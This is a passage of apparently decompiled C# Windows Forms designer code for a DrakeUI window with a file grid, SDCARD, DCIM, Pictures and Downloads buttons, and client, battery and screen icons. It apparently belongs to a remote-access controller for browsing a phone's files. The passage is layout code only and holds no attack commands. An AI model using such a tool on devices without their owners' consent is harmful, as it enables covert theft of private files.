		this.DGVDATA.EnableHeadersVisualStyles = false;
		this.DGVDATA.GridColor = System.Drawing.Color.White;
		this.DGVDATA.Location = new System.Drawing.Point(0, 0);
		this.DGVDATA.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DGVDATA.Name = "DGVDATA";
		this.DGVDATA.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle8.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle8.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle8.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVDATA.RowHeadersDefaultCellStyle = dataGridViewCellStyle8;
		this.DGVDATA.RowHeadersVisible = false;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle9.Font = new System.Drawing.Font("Roboto Slab", 10f);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.White;
		this.DGVDATA.RowsDefaultCellStyle = dataGridViewCellStyle9;
		this.DGVDATA.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVDATA.Size = new System.Drawing.Size(837, 774);
		this.DGVDATA.TabIndex = 7;
		this.N.HeaderText = "Name";
		this.N.Name = "N";
		this.P.HeaderText = "Path";
		this.P.Name = "P";
		this.S.HeaderText = "Size";
		this.S.Name = "S";
		this.D.HeaderText = "Downloaded";
		this.D.Name = "D";
		this.ST.HeaderText = "Status";
		this.ST.Name = "ST";
		this.Panel6.BackColor = System.Drawing.Color.Black;
		this.Panel6.Controls.Add(this.Label1);
		this.Panel6.Controls.Add(this.seentext);
		this.Panel6.Controls.Add(this.Selecttext);
		this.Panel6.Controls.Add(this.CountText);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel6.Location = new System.Drawing.Point(0, 774);
		this.Panel6.Name = "Panel6";
		this.Panel6.Size = new System.Drawing.Size(837, 25);
		this.Panel6.TabIndex = 10;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Right;
		this.Label1.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.Label1.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(693, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(144, 25);
		this.Label1.TabIndex = 3;
		this.Label1.Text = "...";
		this.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.seentext.Dock = System.Windows.Forms.DockStyle.Left;
		this.seentext.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.seentext.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.seentext.ForeColor = System.Drawing.Color.SkyBlue;
		this.seentext.Location = new System.Drawing.Point(321, 0);
		this.seentext.Name = "seentext";
		this.seentext.Size = new System.Drawing.Size(155, 25);
		this.seentext.TabIndex = 2;
		this.seentext.Text = "Seen";
		this.Selecttext.Dock = System.Windows.Forms.DockStyle.Left;
		this.Selecttext.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.Selecttext.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Selecttext.ForeColor = System.Drawing.Color.SkyBlue;
		this.Selecttext.Location = new System.Drawing.Point(141, 0);
		this.Selecttext.Name = "Selecttext";
		this.Selecttext.Size = new System.Drawing.Size(180, 25);
		this.Selecttext.TabIndex = 1;
		this.Selecttext.Text = "Selected";
		this.CountText.Dock = System.Windows.Forms.DockStyle.Left;
		this.CountText.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.CountText.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.CountText.ForeColor = System.Drawing.Color.SkyBlue;
		this.CountText.Location = new System.Drawing.Point(0, 0);
		this.CountText.Name = "CountText";
		this.CountText.Size = new System.Drawing.Size(141, 25);
		this.CountText.TabIndex = 0;
		this.CountText.Text = "All";
		this.Panel3.BackColor = System.Drawing.Color.Black;
		this.Panel3.Controls.Add(this.Downloadnum);
		this.Panel3.Controls.Add(this.Downpic);
		this.Panel3.Controls.Add(this.thumb_chk);
		this.Panel3.Controls.Add(this.ClearButton);
		this.Panel3.Controls.Add(this.cancelbtn);
		this.Panel3.Controls.Add(this.DrakeWidth_W4);
		this.Panel3.Controls.Add(this.DrakeWidth_W3);
		this.Panel3.Controls.Add(this.DrakeWidth_W2);
		this.Panel3.Controls.Add(this.viwimage);
		this.Panel3.Controls.Add(this.usrscreen);
		this.Panel3.Controls.Add(this.Usrbtry);
		this.Panel3.Controls.Add(this.sdbtn);
		this.Panel3.Controls.Add(this.dcmbtn);
		this.Panel3.Controls.Add(this.ClientPic);
		this.Panel3.Controls.Add(this.picbtn);
		this.Panel3.Controls.Add(this.Panel4);
		this.Panel3.Controls.Add(this.ThumbsCont);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel3.Location = new System.Drawing.Point(0, 0);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(179, 850);
		this.Panel3.TabIndex = 20;
		this.Downloadnum.AutoSize = true;
		this.Downloadnum.Font = new System.Drawing.Font("Calibri", 14f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Downloadnum.Location = new System.Drawing.Point(81, 231);
		this.Downloadnum.Name = "Downloadnum";
		this.Downloadnum.Size = new System.Drawing.Size(25, 29);
		this.Downloadnum.TabIndex = 37;
		this.Downloadnum.Text = "0";
		this.Downpic.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Downpic.FillColor = System.Drawing.Color.Black;
		this.Downpic.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.Downpic.FillPressColor = System.Drawing.Color.Black;
		this.Downpic.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.Downpic.Font = new System.Drawing.Font("Calibri", 12f);
		this.Downpic.ForeColor = System.Drawing.Color.SkyBlue;
		this.Downpic.ForePressColor = System.Drawing.Color.SkyBlue;
		this.Downpic.Location = new System.Drawing.Point(9, 263);
		this.Downpic.Name = "Downpic";
		this.Downpic.Radius = 25;
		this.Downpic.RectColor = System.Drawing.Color.SkyBlue;
		this.Downpic.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Downpic.RectHoverColor = System.Drawing.Color.White;
		this.Downpic.RectPressColor = System.Drawing.Color.White;
		this.Downpic.RectSelectedColor = System.Drawing.Color.White;
		this.Downpic.Size = new System.Drawing.Size(163, 26);
		this.Downpic.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Downpic.Symbol = 61639;
		this.Downpic.TabIndex = 36;
		this.Downpic.Tag = "off";
		this.Downpic.Text = "Downloads";
		this.thumb_chk.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.thumb_chk.Checked = true;
		this.thumb_chk.Cursor = System.Windows.Forms.Cursors.Hand;
		this.thumb_chk.Font = new System.Drawing.Font("Calibri", 12f);
		this.thumb_chk.Location = new System.Drawing.Point(16, 186);
		this.thumb_chk.Name = "thumb_chk";
		this.thumb_chk.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.thumb_chk.Size = new System.Drawing.Size(53, 29);
		this.thumb_chk.Style = DrakeUI.Framework.UIStyle.Custom;
		this.thumb_chk.StyleCustomMode = true;
		this.thumb_chk.TabIndex = 35;
		this.ClearButton.Cursor = System.Windows.Forms.Cursors.Hand;
		this.ClearButton.FillColor = System.Drawing.Color.Black;
		this.ClearButton.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.ClearButton.FillPressColor = System.Drawing.Color.Black;
		this.ClearButton.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.ClearButton.Font = new System.Drawing.Font("Calibri", 12f);
		this.ClearButton.ForeColor = System.Drawing.Color.SkyBlue;
		this.ClearButton.ForePressColor = System.Drawing.Color.SkyBlue;
		this.ClearButton.Location = new System.Drawing.Point(10, 360);
		this.ClearButton.Name = "ClearButton";
		this.ClearButton.Radius = 25;
		this.ClearButton.RectColor = System.Drawing.Color.SkyBlue;
		this.ClearButton.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.ClearButton.RectHoverColor = System.Drawing.Color.White;
		this.ClearButton.RectPressColor = System.Drawing.Color.White;
		this.ClearButton.RectSelectedColor = System.Drawing.Color.White;
		this.ClearButton.Size = new System.Drawing.Size(163, 26);
		this.ClearButton.Style = DrakeUI.Framework.UIStyle.Custom;
		this.ClearButton.TabIndex = 34;
		this.ClearButton.Text = "Clear";
		this.ClearButton.Visible = false;
		this.cancelbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.cancelbtn.FillColor = System.Drawing.Color.Black;
		this.cancelbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.cancelbtn.FillPressColor = System.Drawing.Color.Black;
		this.cancelbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.cancelbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.cancelbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.cancelbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.cancelbtn.Location = new System.Drawing.Point(10, 319);
		this.cancelbtn.Name = "cancelbtn";
		this.cancelbtn.Radius = 25;
		this.cancelbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.cancelbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.cancelbtn.RectHoverColor = System.Drawing.Color.White;
		this.cancelbtn.RectPressColor = System.Drawing.Color.White;
		this.cancelbtn.RectSelectedColor = System.Drawing.Color.White;
		this.cancelbtn.Size = new System.Drawing.Size(163, 26);
		this.cancelbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.cancelbtn.Symbol = 61534;
		this.cancelbtn.TabIndex = 33;
		this.cancelbtn.Text = "Stop";
		this.cancelbtn.Visible = false;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.SkyBlue;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(39, 403);
		this.DrakeWidth_W4.Name = "DrakeWidth_W4";
		this.DrakeWidth_W4.Size = new System.Drawing.Size(100, 1);
		this.DrakeWidth_W4.TabIndex = 32;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.SkyBlue;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(39, 222);
		this.DrakeWidth_W3.Name = "DrakeWidth_W3";
		this.DrakeWidth_W3.Size = new System.Drawing.Size(100, 1);
		this.DrakeWidth_W3.TabIndex = 31;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.SkyBlue;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(39, 171);
		this.DrakeWidth_W2.Name = "DrakeWidth_W2";
		this.DrakeWidth_W2.Size = new System.Drawing.Size(100, 1);
		this.DrakeWidth_W2.TabIndex = 30;
		this.viwimage.BackColor = System.Drawing.Color.Black;
		this.viwimage.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.viwimage.Location = new System.Drawing.Point(0, 430);
		this.viwimage.Name = "viwimage";
		this.viwimage.Size = new System.Drawing.Size(179, 379);
		this.viwimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.viwimage.TabIndex = 19;
		this.viwimage.TabStop = false;
		this.viwimage.Visible = false;
		this.usrscreen.Location = new System.Drawing.Point(114, 8);
		this.usrscreen.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.usrscreen.Name = "usrscreen";
		this.usrscreen.Size = new System.Drawing.Size(33, 33);
		this.usrscreen.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.usrscreen.TabIndex = 14;
		this.usrscreen.TabStop = false;
		this.Usrbtry.Location = new System.Drawing.Point(75, 8);
		this.Usrbtry.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.Usrbtry.Name = "Usrbtry";
		this.Usrbtry.Size = new System.Drawing.Size(33, 33);
		this.Usrbtry.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.Usrbtry.TabIndex = 17;
		this.Usrbtry.TabStop = false;
		this.sdbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.sdbtn.FillColor = System.Drawing.Color.Black;
		this.sdbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.sdbtn.FillPressColor = System.Drawing.Color.Black;
		this.sdbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.sdbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.sdbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.sdbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.sdbtn.Location = new System.Drawing.Point(11, 61);
		this.sdbtn.Name = "sdbtn";
		this.sdbtn.Radius = 25;
		this.sdbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.sdbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.sdbtn.RectHoverColor = System.Drawing.Color.White;
		this.sdbtn.RectPressColor = System.Drawing.Color.White;
		this.sdbtn.RectSelectedColor = System.Drawing.Color.White;
		this.sdbtn.Size = new System.Drawing.Size(161, 26);
		this.sdbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.sdbtn.Symbol = 61563;
		this.sdbtn.TabIndex = 24;
		this.sdbtn.Text = "SDCARD";
		this.dcmbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.dcmbtn.FillColor = System.Drawing.Color.Black;
		this.dcmbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.dcmbtn.FillPressColor = System.Drawing.Color.Black;
		this.dcmbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.dcmbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.dcmbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.dcmbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.dcmbtn.Location = new System.Drawing.Point(9, 93);
		this.dcmbtn.Name = "dcmbtn";
		this.dcmbtn.Radius = 25;
		this.dcmbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.dcmbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.dcmbtn.RectHoverColor = System.Drawing.Color.White;
		this.dcmbtn.RectPressColor = System.Drawing.Color.White;
		this.dcmbtn.RectSelectedColor = System.Drawing.Color.White;
		this.dcmbtn.Size = new System.Drawing.Size(163, 26);
		this.dcmbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.dcmbtn.Symbol = 61502;
		this.dcmbtn.TabIndex = 25;
		this.dcmbtn.Text = "DCIM";
		this.ClientPic.Location = new System.Drawing.Point(34, 8);
		this.ClientPic.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.ClientPic.Name = "ClientPic";
		this.ClientPic.Size = new System.Drawing.Size(35, 34);
		this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.ClientPic.TabIndex = 10;
		this.ClientPic.TabStop = false;
		this.picbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.picbtn.FillColor = System.Drawing.Color.Black;
		this.picbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.picbtn.FillPressColor = System.Drawing.Color.Black;
		this.picbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.picbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.picbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.picbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.picbtn.Location = new System.Drawing.Point(9, 125);
		this.picbtn.Name = "picbtn";
		this.picbtn.Radius = 25;
		this.picbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.picbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.picbtn.RectHoverColor = System.Drawing.Color.White;
		this.picbtn.RectPressColor = System.Drawing.Color.White;
		this.picbtn.RectSelectedColor = System.Drawing.Color.White;
		this.picbtn.Size = new System.Drawing.Size(163, 26);
		this.picbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.picbtn.Symbol = 62142;
		this.picbtn.TabIndex = 26;
		this.picbtn.Text = "Pictures";
		this.Panel4.Controls.Add(this.DrakeUIButtonIcon7);
		this.Panel4.Controls.Add(this.DrakeUIButtonIcon8);
		this.Panel4.Controls.Add(this.DrakeUIButtonIcon6);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel4.Location = new System.Drawing.Point(0, 809);
		this.Panel4.Name = "Panel4";
		this.Panel4.Size = new System.Drawing.Size(179, 41);
		this.Panel4.TabIndex = 21;
		this.DrakeUIButtonIcon7.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon7.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUIButtonIcon7.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon7.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon7.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon7.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon7.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.Location = new System.Drawing.Point(58, 0);
		this.DrakeUIButtonIcon7.Name = "DrakeUIButtonIcon7";
		this.DrakeUIButtonIcon7.Radius = 0;
		this.DrakeUIButtonIcon7.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.RectDisableColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon7.RectHoverColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon7.RectPressColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon7.RectSelectedColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon7.Size = new System.Drawing.Size(63, 41);
		this.DrakeUIButtonIcon7.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon7.Symbol = 61470;
		this.DrakeUIButtonIcon7.SymbolSize = 29;
		this.DrakeUIButtonIcon7.TabIndex = 29;
		this.DrakeUIButtonIcon8.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon8.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon8.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon8.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon8.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon8.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon8.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIButtonIcon8.Name = "DrakeUIButtonIcon8";
		this.DrakeUIButtonIcon8.Radius = 0;
		this.DrakeUIButtonIcon8.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.RectDisableColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon8.RectHoverColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon8.RectPressColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon8.RectSelectedColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon8.Size = new System.Drawing.Size(58, 41);
		this.DrakeUIButtonIcon8.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon8.Symbol = 57439;
		this.DrakeUIButtonIcon8.SymbolSize = 29;
		this.DrakeUIButtonIcon8.TabIndex = 30;
		this.DrakeUIButtonIcon6.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon6.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon6.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon6.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon6.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon6.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon6.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon6.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon6.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon6.Location = new System.Drawing.Point(121, 0);
		this.DrakeUIButtonIcon6.Name = "DrakeUIButtonIcon6";
		this.DrakeUIButtonIcon6.Radius = 0;
		this.DrakeUIButtonIcon6.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon6.RectDisableColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon6.RectHoverColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon6.RectPressColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon6.RectSelectedColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon6.Size = new System.Drawing.Size(58, 41);
		this.DrakeUIButtonIcon6.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon6.Symbol = 61539;
		this.DrakeUIButtonIcon6.SymbolSize = 29;
		this.DrakeUIButtonIcon6.TabIndex = 28;
		this.clinumb.AutoSize = true;
		this.clinumb.ForeColor = System.Drawing.Color.SkyBlue;
		this.clinumb.Location = new System.Drawing.Point(11, 52);
		this.clinumb.Name = "clinumb";
		this.clinumb.Size = new System.Drawing.Size(11, 17);
		this.clinumb.TabIndex = 19;
		this.clinumb.Text = " ";
		this.Timer1.Interval = 2500;
		this.Label2.AutoSize = true;
		this.Label2.Font = new System.Drawing.Font("Calibri", 20f, System.Drawing.FontStyle.Bold);
		this.Label2.Location = new System.Drawing.Point(3, 9);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(0, 41);
		this.Label2.TabIndex = 9;
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.Panel2.Controls.Add(this.pathtxt);
		this.Panel2.Controls.Add(this.clearsrchbtn);
		this.Panel2.Controls.Add(this.searchtext);
		this.Panel2.Controls.Add(this.searchbtn);
		this.Panel2.Controls.Add(this.clinumb);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon5);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon4);
		this.Panel2.Controls.Add(this.DrakeWidth_W1);
		this.Panel2.Controls.Add(this.Label2);
		this.Panel2.Controls.Add(this.PB);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(179, 0);
		this.Panel2.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(837, 51);
		this.Panel2.TabIndex = 8;
		this.pathtxt.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.pathtxt.Cursor = System.Windows.Forms.Cursors.No;
		this.pathtxt.FillColor = System.Drawing.Color.White;
		this.pathtxt.FillDisableColor = System.Drawing.Color.Black;
		this.pathtxt.Font = new System.Drawing.Font("Calibri", 9f);
		this.pathtxt.ForeColor = System.Drawing.Color.Black;
		this.pathtxt.Location = new System.Drawing.Point(89, 9);
		this.pathtxt.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.pathtxt.Maximum = 2147483647.0;
		this.pathtxt.Minimum = -2147483648.0;
		this.pathtxt.Name = "pathtxt";
		this.pathtxt.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.pathtxt.ReadOnly = true;
		this.pathtxt.RectColor = System.Drawing.Color.SkyBlue;
		this.pathtxt.RectDisableColor = System.Drawing.Color.Black;
		this.pathtxt.Size = new System.Drawing.Size(438, 26);
		this.pathtxt.Style = DrakeUI.Framework.UIStyle.Custom;
		this.pathtxt.StyleCustomMode = true;
		this.pathtxt.TabIndex = 29;
		this.pathtxt.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.clearsrchbtn.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.clearsrchbtn.AvatarSize = 25;
		this.clearsrchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clearsrchbtn.FillColor = System.Drawing.Color.Black;
		this.clearsrchbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.clearsrchbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.clearsrchbtn.Location = new System.Drawing.Point(534, 9);
		this.clearsrchbtn.Margin = new System.Windows.Forms.Padding(4);
		this.clearsrchbtn.Name = "clearsrchbtn";
		this.clearsrchbtn.Size = new System.Drawing.Size(27, 26);
		this.clearsrchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clearsrchbtn.StyleCustomMode = true;
		this.clearsrchbtn.Symbol = 77;
		this.clearsrchbtn.SymbolSize = 30;
		this.clearsrchbtn.TabIndex = 36;
		this.clearsrchbtn.Visible = false;
		this.searchtext.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.searchtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.searchtext.FillColor = System.Drawing.Color.Black;
		this.searchtext.Font = new System.Drawing.Font("Calibri", 9f);
		this.searchtext.ForeColor = System.Drawing.Color.White;
		this.searchtext.Location = new System.Drawing.Point(570, 10);
		this.searchtext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.searchtext.Maximum = 2147483647.0;
		this.searchtext.Minimum = -2147483648.0;
		this.searchtext.Name = "searchtext";
		this.searchtext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.searchtext.Radius = 15;
		this.searchtext.RectColor = System.Drawing.Color.SkyBlue;
		this.searchtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.searchtext.Size = new System.Drawing.Size(222, 26);
		this.searchtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.searchtext.StyleCustomMode = true;
		this.searchtext.TabIndex = 34;
		this.searchtext.Watermark = "Search By Name,Type,Date";
		this.searchbtn.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.searchbtn.AvatarSize = 25;
		this.searchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.searchbtn.FillColor = System.Drawing.Color.Black;
		this.searchbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.searchbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.searchbtn.Location = new System.Drawing.Point(798, 9);
		this.searchbtn.Margin = new System.Windows.Forms.Padding(4);
		this.searchbtn.Name = "searchbtn";
		this.searchbtn.Size = new System.Drawing.Size(33, 27);
		this.searchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.searchbtn.StyleCustomMode = true;
		this.searchbtn.Symbol = 85;
		this.searchbtn.SymbolSize = 30;
		this.searchbtn.TabIndex = 35;
		this.DrakeUIButtonIcon5.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon5.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon5.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon5.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon5.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon5.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.Location = new System.Drawing.Point(48, 10);
		this.DrakeUIButtonIcon5.Name = "DrakeUIButtonIcon5";
		this.DrakeUIButtonIcon5.Radius = 0;
		this.DrakeUIButtonIcon5.RectColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon5.RectDisableColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon5.RectHoverColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon5.RectPressColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon5.RectSelectedColor = System.Drawing.Color.Transparent;
